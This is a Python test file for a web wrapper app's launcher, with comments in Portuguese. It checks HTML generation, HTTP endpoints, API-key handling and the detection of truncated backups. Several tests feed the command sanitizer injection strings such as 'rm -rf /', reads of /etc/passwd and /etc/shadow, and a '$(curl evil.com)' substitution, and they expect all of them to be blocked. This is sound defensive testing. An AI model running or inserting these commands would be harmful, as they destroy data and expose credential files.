"""Testes para launch_app.py — funcoes puras, HTML e endpoints HTTP.

Cobre:
  - set_drive_info, load_keys_from_drive
  - create_wrapper_html (HTML valido com 4 features)
  - sanitize_command integrado
  - Endpoints HTTP com servidor real: /api/health, /api/theme, /api/backups,
    /api/sessions, /api/apikey, /api/run_terminal (sanitizacao)
"""

import os
import sys
import json
import time
import urllib.request
import urllib.error

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from pesquisai import launch_app
from pesquisai import constants as C
from pesquisai.constants import VERSION


# ═══════════════════════════════════════════════════════════════
# FUNCOES PURAS
# ═══════════════════════════════════════════════════════════════

class TestSetDriveInfo:
    """set_drive_info define variaveis globais."""

    def test_set_drive_info(self):
        launch_app.set_drive_info("/tmp/test_pesquisai", "https://drive.google.com/x")
        assert launch_app._folder_path == "/tmp/test_pesquisai"
        assert launch_app._drive_url == "https://drive.google.com/x"
        launch_app.set_drive_info("/content", "https://drive.google.com/drive/my-drive")


class TestLoadKeysFromDrive:
    """load_keys_from_drive em condicoes de erro."""

    def test_nonexistent_dir(self, tmp_path):
        assert launch_app.load_keys_from_drive(str(tmp_path / "nao_existe"), {}) == []

    def test_empty_dir(self, tmp_path):
        assert launch_app.load_keys_from_drive(str(tmp_path), {}) == []


class TestCreateWrapperHtml:
    """create_wrapper_html gera HTML valido."""

    def test_html_contains_features(self, tmp_path, monkeypatch):
        """HTML deve conter 4 features e VERSION dinamico."""
        monkeypatch.setattr("pesquisai.launch_app.WRAPPER_DIR", str(tmp_path))
        launch_app.create_wrapper_html(
            "http://localhost:8000", "https://drive.google.com/test")
        html = open(os.path.join(str(tmp_path), "index.html"), encoding="utf-8").read()
        assert len(html) > 5000
        assert f"v{VERSION}" in html
        assert "openHealth()" in html
        assert "openSessions()" in html
        assert "openShortcuts()" in html
        assert "toggleTheme()" in html
        assert 'id="health-overlay"' in html
        assert 'id="sessions-overlay"' in html
        assert 'id="shortcuts-overlay"' in html

    def test_html_contains_urls(self, tmp_path, monkeypatch):
        """HTML deve conter as URLs passadas."""
        monkeypatch.setattr("pesquisai.launch_app.WRAPPER_DIR", str(tmp_path))
        launch_app.create_wrapper_html(
            "http://localhost:9999", "https://drive.google.com/abc")
        html = open(os.path.join(str(tmp_path), "index.html"), encoding="utf-8").read()
        assert "http://localhost:9999" in html
        assert "https://drive.google.com/abc" in html

    def test_html_contains_providers(self, tmp_path, monkeypatch):
        """HTML deve conter a lista de provedores de IA."""
        monkeypatch.setattr("pesquisai.launch_app.WRAPPER_DIR", str(tmp_path))
        launch_app.create_wrapper_html("http://t", "http://d")
        html = open(os.path.join(str(tmp_path), "index.html"), encoding="utf-8").read()
        assert "anthropic" in html
        assert "openai" in html
        assert "PROVIDERS" in html

    def test_html_contains_backup_buttons(self, tmp_path, monkeypatch):
        """HTML deve conter botoes de backup e restaurar."""
        monkeypatch.setattr("pesquisai.launch_app.WRAPPER_DIR", str(tmp_path))
        launch_app.create_wrapper_html("http://t", "http://d")
        html = open(os.path.join(str(tmp_path), "index.html"), encoding="utf-8").read()
        assert "doBackup()" in html
        assert "openRestore()" in html


class TestSanitizeIntegration:
    """sanitize_command integrado no contexto do endpoint."""

    def test_malicious_commands_blocked(self):
        from pesquisai.security import sanitize_command
        for cmd in [
            'opencode; rm -rf /',
            'opencode | cat /etc/passwd',
            'opencode $(curl evil.com)',
            'opencode`whoami`',
            'opencode > /etc/shadow',
            'opencode -s ses abc',
        ]:
            ok, _ = sanitize_command(cmd)
            assert not ok, f"Deveria bloquear: {cmd}"

    def test_valid_provider_command(self):
        from pesquisai.security import sanitize_command
        ok, _ = sanitize_command('export OPENAI_API_KEY="sk-abc" && opencode')
        assert ok


# ═══════════════════════════════════════════════════════════════
# SERVIDOR HTTP REAL (endpoints)
# ═══════════════════════════════════════════════════════════════

TEST_PORT = 18099
_server_started = False


def _ensure_server(tmp_path, monkeypatch):
    """Inicia servidor wrapper uma unica vez (reusa entre testes da classe)."""
    global _server_started
    if _server_started:
        return
    monkeypatch.setattr(C, "WRAPPER_PORT", TEST_PORT)
    monkeypatch.setattr("pesquisai.launch_app.WRAPPER_PORT", TEST_PORT)
    monkeypatch.setattr("pesquisai.launch_app.WRAPPER_DIR", str(tmp_path / "wrapper"))
    os.makedirs(str(tmp_path / "wrapper"), exist_ok=True)
    launch_app._opencode_bin = "/usr/bin/python3"
    launch_app._env = dict(os.environ)
    backup_dir = str(tmp_path / "backups")
    os.makedirs(backup_dir, exist_ok=True)
    launch_app.set_drive_info(backup_dir, "https://drive.google.com/test")
    launch_app.start_wrapper_server()
    time.sleep(1.5)
    _server_started = True


def _get(path):
    with urllib.request.urlopen(f"http://localhost:{TEST_PORT}{path}", timeout=5) as r:
        return json.loads(r.read())


def _post(path, data):
    req = urllib.request.Request(
        f"http://localhost:{TEST_PORT}{path}",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=5) as r:
        return json.loads(r.read())


class TestHealthEndpoint:
    """GET /api/health — dashboard de saude."""

    def test_health_returns_ok(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        h = _get("/api/health")
        assert h["ok"] is True
        assert h["version"] == VERSION
        assert "checks" in h

    def test_health_checks_fields(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        c = _get("/api/health")["checks"]
        for field in ["drive_mounted", "backup_dir_exists", "ttyd_alive",
                      "opencode_bin", "opencode_found", "keys_loaded_count",
                      "skills_loaded", "skills_count", "disk_free_mb"]:
            assert field in c, f"Campo faltando: {field}"


class TestThemeEndpoint:
    """GET/POST /api/theme — tema claro/escuro."""

    def test_theme_get(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        t = _get("/api/theme")
        assert "theme" in t

    def test_theme_post_light(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _post("/api/theme", {"theme": "pesquisai-light"})
        assert r["ok"] is True
        assert r["theme"] == "pesquisai-light"

    def test_theme_post_dark(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _post("/api/theme", {"theme": "pesquisai"})
        assert r["ok"] is True

    def test_theme_post_invalid(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        try:
            _post("/api/theme", {"theme": "invalido"})
            assert False, "Deveria rejeitar tema invalido"
        except urllib.error.HTTPError as e:
            assert e.code == 400


class TestBackupsEndpoint:
    """GET /api/backups — lista backups."""

    def test_backups_empty(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _get("/api/backups")
        assert "backups" in r
        assert isinstance(r["backups"], list)

    def test_backups_lists_files(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        # O servidor usa /content/drive/My Drive/PesquisAI/backups como
        # DRIVE_BACKUP_DIR (hardcodeado em start_wrapper_server). Criar la.
        real_backup = "/content/drive/My Drive/PesquisAI/backups"
        os.makedirs(real_backup, exist_ok=True)
        fname = "backup_test_pesquisai.json"
        fpath = os.path.join(real_backup, fname)
        with open(fpath, "w") as f:
            f.write("{}")
        try:
            r = _get("/api/backups")
            assert fname in r["backups"]
        finally:
            if os.path.exists(fpath):
                os.remove(fpath)


class TestApikeyEndpoint:
    """GET/POST /api/apikey — gerenciamento de chaves."""

    def test_apikey_get_empty(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _get("/api/apikey")
        assert "keys" in r

    def test_apikey_get_specific_provider(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _get("/api/apikey?provider=anthropic")
        assert "apikey" in r

    def test_apikey_post_saves(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _post("/api/apikey", {
            "provider": "openai",
            "env": "OPENAI_API_KEY",
            "apikey": "sk-test-123",
        })
        assert r["ok"] is True

    def test_apikey_post_missing_fields(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        try:
            _post("/api/apikey", {"provider": ""})
            assert False, "Deveria rejeitar campos faltando"
        except urllib.error.HTTPError as e:
            assert e.code == 400


class TestRunTerminalEndpoint:
    """POST /api/run_terminal — executar comando no terminal (com sanitizacao)."""

    def test_valid_opencode(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        from unittest.mock import patch as _patch, MagicMock as _MM
        with _patch("subprocess.run", return_value=_MM()), \
             _patch("subprocess.Popen", return_value=_MM()):
            r = _post("/api/run_terminal", {"command": "opencode"})
            assert r["ok"] is True

    def test_malicious_command_rejected(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        try:
            _post("/api/run_terminal", {"command": "opencode; rm -rf /"})
            assert False, "Comando malicioso deveria ser rejeitado"
        except urllib.error.HTTPError as e:
            assert e.code == 403

    def test_empty_command_rejected(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        try:
            _post("/api/run_terminal", {"command": ""})
            assert False, "Comando vazio deveria ser rejeitado"
        except urllib.error.HTTPError as e:
            assert e.code == 400


class TestApiKeyApplyEndpoint:
    """POST /api/apikey/apply — aplica keys salvas no ambiente."""

    def test_apply_returns_response(self, tmp_path, monkeypatch):
        _ensure_server(tmp_path, monkeypatch)
        r = _post("/api/apikey/apply", {})
        assert "ok" in r


class TestBackupIntegrity:
    """Validacao de integridade de backups contra truncamento FUSE.

    Causa raiz: Google Drive FUSE trunca escrita em chunk de buffer
    (64KB/256KB/512KB) mas getsize() reporta tamanho alvo. Solucao:
    validar JSON lendo de volta do Drive apos copy.
    """

    def test_valid_json_detected(self, tmp_path):
        """JSON valido deve passar na validacao."""
        f = tmp_path / "valid.json"
        data = {"info": {"id": "ses_abc"}, "messages": ["ok"]}
        with open(f, "w") as fh:
            json.dump(data, fh)
        # Simular a validacao do endpoint
        with open(f, "r", encoding="utf-8") as fh:
            json.load(fh)  # nao levanta = valido

    def test_truncated_json_detected(self, tmp_path):
        """JSON truncado (simulando FUSE) deve falhar na validacao."""
        f = tmp_path / "trunc.json"
        data = {"info": {"id": "ses_abc"}, "messages": ["x" * 200000]}
        with open(f, "w") as fh:
            json.dump(data, fh)
        # Truncar para 64KB (potencia de 2 — assinatura classica FUSE)
        with open(f, "r+b") as fh:
            fh.truncate(65536)
        size = os.path.getsize(f)
        # Heuristica potencia-de-2
        is_pow2 = size > 0 and (size & (size - 1)) == 0
        assert is_pow2 is True, f"65536 deveria ser potencia de 2"
        # Validacao JSON deve falhar
        try:
            with open(f, "r", encoding="utf-8") as fh:
                json.load(fh)
            assert False, "JSON truncado nao deveria passar"
        except json.JSONDecodeError:
            pass  # esperado

    def test_truncated_256kb_detected(self, tmp_path):
        """Truncamento em 256KB (2^18) deve ser detectado."""
        f = tmp_path / "trunc256.json"
        data = {"x": "a" * 600000}
        with open(f, "w") as fh:
            json.dump(data, fh)
        with open(f, "r+b") as fh:
            fh.truncate(262144)
        size = os.path.getsize(f)
        assert size == 262144
        is_pow2 = size > 0 and (size & (size - 1)) == 0
        assert is_pow2 is True
        try:
            with open(f, "r", encoding="utf-8") as fh:
                json.load(fh)
            assert False
        except json.JSONDecodeError:
            pass

    def test_flock_import_available(self):
        """fcntl.flock deve estar disponivel (Linux) para lock de backup."""
        try:
            import fcntl
            assert hasattr(fcntl, "flock")
            assert hasattr(fcntl, "LOCK_EX")
            assert hasattr(fcntl, "LOCK_UN")
        except ImportError:
            import pytest
            pytest.skip("fcntl nao disponivel (Windows)")
